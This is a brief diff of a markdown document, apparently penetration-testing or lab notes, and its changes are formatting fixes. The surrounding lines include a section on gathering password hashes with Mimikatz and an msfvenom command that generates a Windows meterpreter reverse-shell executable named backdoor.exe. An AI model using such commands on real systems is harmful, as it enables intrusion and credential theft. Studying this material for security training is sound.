@@ -44,12 +44,12 @@ run vnc
 ```
 </details>
 
-<details><
+<details>
 <summary>Escalate privileges to gather hashdump using Mimikatz</summary>
 
   ```console
   
-[linux]
+        [linux]
 		
 	sudo su
 	msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP] lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
